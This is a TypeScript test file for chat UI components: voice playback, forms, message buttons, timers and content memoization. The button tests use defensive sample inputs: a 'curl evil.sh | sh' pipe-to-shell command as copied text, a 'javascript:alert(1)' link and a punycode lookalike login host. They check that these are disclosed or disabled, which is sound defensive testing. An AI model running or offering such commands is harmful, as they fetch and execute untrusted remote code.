import { buildBlockTree, type ButtonModel, type FormBlock, type FormSubmissionValue } from "@inline/chat-ui"
import type { ContentBlock, MessageActionButton, MessageRow } from "@inline/core-protocol"
import type { ChatID, MessageID, UserID } from "@inline/ids"
import { createManualClock } from "@inline/ui"
import { describe, expect, it } from "vitest"
import { ActionRunner, buttonDisclosure, COPY_PREVIEW_GRAPHEMES, disclosureText, presentButton } from "./buttons"
import { ContentMemo, DisclosureState, hasContent, messageHasContent } from "./content-memo"
import { createContentEnv } from "./env"
import { splitFileName } from "./file-name"
import { FormController, formLockReason, formSendFailedText } from "./form-controller"
import { ElapsedTimer, TransientFlag } from "./timers"
import { PlaybackGroup, type VoiceAudio, VoicePlayerController } from "./voice-player"

const flush = async () => {
  for (let index = 0; index < 5; index += 1) await Promise.resolve()
}

const row = (extra: Partial<MessageRow> = {}): MessageRow => ({
  kind: "message",
  id: "7:10",
  chatId: "7" as ChatID,
  messageId: "10" as MessageID,
  fromId: "1" as UserID,
  out: false,
  date: 1_700_000_000,
  text: "",
  state: "sent",
  ...extra,
})

const range = (text: string, part: string) => ({ offset: text.indexOf(part), length: part.length })

// ---------------------------------------------------------------------------
// Voice

class FakeAudio extends EventTarget implements VoiceAudio {
  src = ""
  currentTime = 0
  duration = Number.NaN
  paused = true
  plays = 0
  play(): Promise<void> {
    this.plays += 1
    this.paused = false
    return Promise.resolve()
  }
  pause(): void {
    if (this.paused) return
    this.paused = true
    this.dispatchEvent(new Event("pause"))
  }
  fire(type: string): void {
    this.dispatchEvent(new Event(type))
  }
}

describe("VoicePlayerController", () => {
  it("plays, reports position and duration, seeks and ends", () => {
    const player = new VoicePlayerController({ url: "https://m/v.ogg", duration: 12 })
    const audio = new FakeAudio()
    player.part.attach(audio)
    expect(player.status.peek()).toBe("idle")
    player.toggle()
    expect(audio.src).toBe("https://m/v.ogg")
    expect(player.status.peek()).toBe("loading")
    audio.fire("playing")
    expect(player.status.peek()).toBe("playing")
    audio.currentTime = 3
    audio.fire("timeupdate")
    expect(player.position.peek()).toBe(3)
    expect(player.progress()).toBe(0.25)
    audio.duration = 16
    audio.fire("loadedmetadata")
    expect(player.duration.peek()).toBe(16)
    player.seek(0.5)
    expect(audio.currentTime).toBe(8)
    player.toggle()
    expect(player.status.peek()).toBe("paused")
    audio.fire("ended")
    expect(player.position.peek()).toBe(0)
  })

  it("plays one note at a time in a group, and fails visibly", () => {
    const group = new PlaybackGroup()
    const a = new VoicePlayerController({ url: "https://m/a.ogg", duration: 5, group })
    const b = new VoicePlayerController({ url: "https://m/b.ogg", duration: 5, group })
    const audioA = new FakeAudio()
    const audioB = new FakeAudio()
    a.part.attach(audioA)
    const detachB = b.part.attach(audioB)
    a.play()
    audioA.fire("playing")
    b.play()
    expect(audioA.paused).toBe(true)
    expect(a.status.peek()).toBe("paused")
    expect(group.current).toBe(b)
    audioB.fire("error")
    expect(b.status.peek()).toBe("failed")
    expect(group.current).toBeUndefined()
    detachB()
  })

  it("cannot play without a URL", () => {
    const player = new VoicePlayerController({ url: undefined, duration: 3 })
    const audio = new FakeAudio()
    player.part.attach(audio)
    expect(player.canPlay).toBe(false)
    player.toggle()
    expect(audio.plays).toBe(0)
  })
})

// ---------------------------------------------------------------------------
// Forms

const formText = "Deploy?\nName\nToken\nNotify"
const formRow = (closed = false) =>
  row({
    text: formText,
    blocks: [
      {
        kind: "form",
        formId: "f1",
        title: range(formText, "Deploy?"),
        closed,
        requiredGrant: "approve",
        fields: [
          { fieldId: "name", label: range(formText, "Name"), required: true, input: { kind: "text", style: "singleLine" } },
          { fieldId: "token", label: range(formText, "Token"), required: false, input: { kind: "text", style: "secret" } },
          { fieldId: "notify", label: range(formText, "Notify"), required: false, input: { kind: "toggle", defaultValue: true } },
        ],
      } satisfies ContentBlock,
    ],
  })

const formOf = (closed = false): FormBlock => {
  const block = buildBlockTree(formRow(closed))?.blocks[0]
  if (block?.kind !== "form") throw new Error("expected a form")
  return block
}

describe("FormController", () => {
  it("asks for a required answer, submits once, and drops the secret after success", async () => {
    const form = formOf()
    const sent: (readonly FormSubmissionValue[])[] = []
    let resolve: () => void = () => {}
    const controller = new FormController(form, (values) => {
      sent.push(values)
      return new Promise<void>((done) => (resolve = done))
    })
    await controller.submit(form)
    expect(controller.error.peek()).toBe("Answer “Name” first")
    controller.setAnswer(form, "name", { kind: "text", value: "Ada" })
    expect(controller.error.peek()).toBeUndefined()
    controller.setAnswer(form, "token", { kind: "text", value: "s3cret" })
    const pending = controller.submit(form)
    expect(controller.session.peek().phase).toBe("submitting")
    await controller.submit(form)
    expect(sent).toHaveLength(1)
    resolve()
    await pending
    expect(controller.session.peek().phase).toBe("submitted")
    expect(controller.session.peek().answers.token).toEqual({ kind: "text", value: "" })
    expect(controller.editable(form)).toBe(false)
    controller.setAnswer(form, "name", { kind: "text", value: "Changed" })
    expect(controller.session.peek().answers.name).toEqual({ kind: "text", value: "Ada" })
  })

  it("returns to editing with a message when the send fails", async () => {
    const form = formOf()
    const controller = new FormController(form, () => Promise.reject(new Error("offline")))
    controller.setAnswer(form, "name", { kind: "text", value: "Ada" })
    await controller.submit(form)
    expect(controller.session.peek().phase).toBe("editing")
    expect(controller.error.peek()).toBe(formSendFailedText)
    expect(controller.session.peek().answers.name).toEqual({ kind: "text", value: "Ada" })
  })

  it("is read-only without a handler or when closed, and explains a missing grant", async () => {
    const open = formOf()
    const readOnly = new FormController(open, undefined)
    expect(readOnly.editable(open)).toBe(false)
    await readOnly.submit(open)
    expect(readOnly.session.peek().phase).toBe("editing")
    const closed = formOf(true)
    const controller = new FormController(closed, () => Promise.resolve())
    expect(controller.editable(closed)).toBe(false)
    expect(controller.session.peek().phase).toBe("submitted")
    expect(formLockReason(open, () => false)).toBe("Only the agent’s owner can approve")
    expect(formLockReason(open, () => true)).toBeUndefined()
    expect(formLockReason(open, undefined)).toBeUndefined()
    expect(formLockReason(closed, () => false)).toBeUndefined()
  })
})

// ---------------------------------------------------------------------------
// Buttons

const buttonModel = (action: MessageActionButton["action"], extra: Partial<ButtonModel> = {}): ButtonModel => {
  const tree = buildBlockTree(
    row({
      text: "Next?",
      blocks: [{ kind: "nextStep", recap: { offset: 0, length: 5 }, actionIds: ["a"], blocking: false }],
      actions: [[{ actionId: "a", text: "Go", style: "default", action }]],
    }),
  )
  const block = tree?.blocks[0]
  if (block?.kind !== "nextStep" || !block.buttons[0]) throw new Error("expected a button")
  return { ...block.buttons[0], ...extra }
}

describe("buttons", () => {
  it("presents URL buttons as links, unavailable ones disabled with the reason, and checks grants", () => {
    expect(presentButton(buttonModel({ kind: "openUrl", url: "https://example.com/a" }))).toEqual({
      kind: "link",
      link: { kind: "web", href: "https://example.com/a", host: "example.com" },
    })
    expect(
      presentButton(
        buttonModel({ kind: "openUrl", url: "https://example.com/a" }, { confirm: { title: "Open?", text: undefined, confirmLabel: "Open" } }),
      ),
    ).toEqual({ kind: "button", disclosure: { destination: "example.com" } })
    expect(presentButton(buttonModel({ kind: "openUrl", url: "javascript:alert(1)" }))).toEqual({
      kind: "disabled",
      reason: "This action isn’t available",
    })
    const gated = buttonModel({ kind: "callback" }, { requiredGrant: "approve" })
    expect(presentButton(gated, () => false, { owner: "Ada" })).toEqual({ kind: "disabled", reason: "Only Ada can approve" })
    expect(presentButton(gated, () => true)).toEqual({ kind: "button" })
  })

  it("discloses where a link button goes and what a copy button copies", () => {
    const confirm = { title: "Open your invoice", text: "Totally safe", confirmLabel: "Open" }
    // The bot writes the dialog's words; the host comes from the link itself.
    expect(buttonDisclosure(buttonModel({ kind: "openUrl", url: "https://xn--pple-43d.com/login" }, { confirm }))).toEqual({
      destination: "xn--pple-43d.com",
    })
    expect(buttonDisclosure(buttonModel({ kind: "openUrl", url: "https://a.example:8443/x" }))).toEqual({ destination: "a.example:8443" })
    expect(buttonDisclosure(buttonModel({ kind: "openUrl", url: "mailto:ops@example.com?subject=x" }))).toEqual({
      destination: "ops@example.com",
    })
    expect(buttonDisclosure(buttonModel({ kind: "openUrl", url: "tel:+15550100" }))).toEqual({ destination: "+15550100" })
    expect(buttonDisclosure(buttonModel({ kind: "callback" }))).toEqual({})

    const copy = buttonDisclosure(buttonModel({ kind: "copyText", text: `curl evil.sh | sh\n${"x".repeat(500)}\u202e` }))
    expect(copy.copyPreview?.startsWith("curl evil.sh | sh x")).toBe(true)
    expect(Array.from(copy.copyPreview ?? "").length).toBeLessThanOrEqual(COPY_PREVIEW_GRAPHEMES)
    expect(copy.copyPreview).not.toContain("\u202e")
    expect(copy.copyLength).toBe(519)
    expect(disclosureText({ destination: "example.com" })).toBe("Opens example.com")
    expect(disclosureText({ copyPreview: "token-123", copyLength: 9 })).toBe("Copies “token-123”")
    expect(disclosureText(copy)).toMatch(/^Copies “curl evil\.sh \| sh x+…” \(519 characters\)$/)
    expect(disclosureText({})).toBeUndefined()
    expect(presentButton(buttonModel({ kind: "copyText", text: "token-123" }))).toEqual({
      kind: "button",
      disclosure: { copyPreview: "token-123", copyLength: 9 },
    })
  })

  it("tracks a callback until it settles and ignores a second press meanwhile", async () => {
    const runner = new ActionRunner()
    const callback = buttonModel({ kind: "callback" })
    let finish: () => void = () => {}
    let calls = 0
    const perform = () => {
      calls += 1
      return new Promise<void>((done) => (finish = done))
    }
    runner.run(callback, perform)
    expect(runner.isPending("a").peek()).toBe(true)
    runner.run(callback, perform)
    expect(calls).toBe(1)
    finish()
    await flush()
    expect(runner.isPending("a").peek()).toBe(false)
    const copy = buttonModel({ kind: "copyText", text: "x" })
    runner.run(copy, () => Promise.resolve())
    expect(runner.isPending("a").peek()).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Timers

describe("timers", () => {
  it("ticks the elapsed text each second and stops on dispose", () => {
    const clock = createManualClock()
    let now = 1000.4
    const timer = new ElapsedTimer(1000, { clock, nowSeconds: () => now })
    expect(timer.text.peek()).toBe("0s")
    now = 1001
    clock.advance(600)
    expect(timer.text.peek()).toBe("1s")
    now = 1065
    clock.advance(1000)
    expect(timer.text.peek()).toBe("1m 5s")
    timer.dispose()
    expect(clock.pending()).toBe(0)
  })

  it("turns a transient flag off after its duration, restarting on trigger", () => {
    const clock = createManualClock()
    const flag = new TransientFlag(1500, clock)
    flag.trigger()
    clock.advance(1000)
    flag.trigger()
    clock.advance(1000)
    expect(flag.on.peek()).toBe(true)
    clock.advance(500)
    expect(flag.on.peek()).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Content memo

const blocksText = "Intro paragraph.\nSecond paragraph"
const blockRow = (text: string) =>
  row({
    text,
    blocks: [
      { kind: "paragraph", text: range(text, "Intro paragraph.") },
      { kind: "paragraph", text: { offset: 17, length: text.length - 17 } },
    ],
  })

describe("ContentMemo", () => {
  const env = createContentEnv({ names: { user: () => ({ name: "Ada" }) } })

  it("forwards find ranges to the blocks and rebuilds only the paragraphs they touch", () => {
    const memo = new ContentMemo()
    const message = blockRow(blocksText)
    const plain = memo.read(message, env)
    const ranges = [[0, 5]] as const
    const found = memo.read(message, env, undefined, ranges)
    expect(found).not.toBe(plain)
    expect(found.blocks!.blocks[0]).not.toBe(plain.blocks!.blocks[0])
    expect(JSON.stringify(found.blocks!.blocks[0])).toContain("find")
    expect(found.blocks!.blocks[1]).toBe(plain.blocks!.blocks[1])
    // The same array is the same answer.
    expect(memo.read(message, env, undefined, ranges)).toBe(found)
    // Closing find removes the mark again.
    const cleared = memo.read(message, env)
    expect(JSON.stringify(cleared.blocks!.blocks[0])).not.toContain("find")
  })

  it("keeps every model's identity across fresh copies of the same row", () => {
    const memo = new ContentMemo()
    const stripped = new Uint8Array([1, 30, 40, 0xff, 0xd8])
    const base = () =>
      row({
        text: "caption",
        media: {
          kind: "photo",
          photo: { id: "5" as never, sizes: [{ type: "d", width: 800, height: 600, cdnUrl: "https://c/d.jpg" }], stripped: stripped.slice() },
        },
        attachments: [{ kind: "externalTask", id: "9" as never, taskId: "T-1", application: "linear", title: "Fix" }],
        actions: [[{ actionId: "x", text: "Do", style: "default", action: { kind: "callback" } }]],
        via: { kind: "app", app: "claude-code", name: "Claude Code" },
      })
    const first = memo.read(base(), env)
    const second = memo.read({ ...base(), reactions: [{ emoji: "👍", count: 1, mine: true }] }, env)
    expect(second).toBe(first)
    expect(first.via?.tooltip).toBe("Ada sent this using Claude Code, an AI agent.")
    expect(hasContent(first)).toBe(true)
    const third = memo.read({ ...base(), via: { kind: "app", app: "codex", name: "Codex" } }, env)
    expect(third).not.toBe(first)
    expect(third.attachments).toBe(first.attachments)
    expect(third.buttons).toBe(first.buttons)
  })

  it("re-creates only the growing block while streaming", () => {
    const memo = new ContentMemo()
    const a = memo.read(blockRow(`${blocksText}`), env)
    const b = memo.read(blockRow(`${blocksText} grows`), env)
    expect(b.blocks?.blocks[0]).toBe(a.blocks?.blocks[0])
    expect(b.blocks?.blocks[1]).not.toBe(a.blocks?.blocks[1])
    expect(memo.read(blockRow(`${blocksText} grows`), env)).toBe(b)
  })

  it("leaves claimed buttons out of the rows, and lets them back when their disclosure closes", () => {
    const text = "Details\nProceed?"
    const message = row({
      text,
      blocks: [
        {
          kind: "disclosure",
          summary: range(text, "Details"),
          style: "default",
          initiallyOpen: true,
          children: [{ kind: "nextStep", recap: range(text, "Proceed?"), actionIds: ["go"], blocking: true }],
        },
      ],
      actions: [[{ actionId: "go", text: "Go", style: "primary", action: { kind: "callback" } }]],
    })
    const memo = new ContentMemo()
    const state = new DisclosureState()
    const open = memo.read(message, env, state.open.peek())
    expect(open.buttons.rows).toHaveLength(0)
    const key = open.blocks?.blocks[0]?.key ?? ""
    expect(state.isOpen(key, true)).toBe(true)
    state.set(key, false)
    expect(state.isOpen(key, true)).toBe(false)
    const closed = memo.read(message, env, state.open.peek())
    expect(closed.buttons.rows[0]?.[0]?.actionId).toBe("go")
    const before = state.open.peek()
    state.set(key, false)
    expect(state.open.peek()).toBe(before)
  })

  it("tells from the row alone whether the content slot has anything", () => {
    expect(messageHasContent(row({ text: "hi" }))).toBe(false)
    expect(messageHasContent(row({ media: { kind: "nudge" } }))).toBe(false)
    expect(messageHasContent(row({ attachments: [{ kind: "unknown", id: "1" as never }] }))).toBe(false)
    expect(messageHasContent(row({ actions: [[]] }))).toBe(false)
    expect(messageHasContent(row({ replies: { kind: "reply", chatId: "9" as ChatID, count: 0, hasUnread: false, recentUserIds: [] } }))).toBe(false)
    expect(messageHasContent(row({ via: { kind: "app", app: "codex" } }))).toBe(true)
    expect(messageHasContent(row({ blocks: [{ kind: "separator" }] }))).toBe(true)
    expect(messageHasContent(row({ forward: {}, service: { kind: "unknown" } }))).toBe(false)
  })

  it("reports nothing to draw for a plain or nudge message", () => {
    const memo = new ContentMemo()
    expect(hasContent(memo.read(row({ text: "hi" }), env))).toBe(false)
    expect(hasContent(new ContentMemo().read(row({ text: "👋", media: { kind: "nudge" } }), env))).toBe(false)
  })
})

// ---------------------------------------------------------------------------

describe("splitFileName", () => {
  it("keeps short names whole and the extension with a few stem characters for long ones", () => {
    expect(splitFileName("notes.txt")).toEqual({ head: "notes.txt", tail: "" })
    expect(splitFileName("quarterly-report-final-v2.pdf")).toEqual({ head: "quarterly-report-final", tail: "-v2.pdf" })
    expect(splitFileName("a-very-long-name-without-extension")).toEqual({
      head: "a-very-long-name-without-extens",
      tail: "ion",
    })
    expect(splitFileName("archive.with.a.really-long-extension-part")).toEqual({
      head: "archive.with.a.really-long-extension-p",
      tail: "art",
    })
  })
})
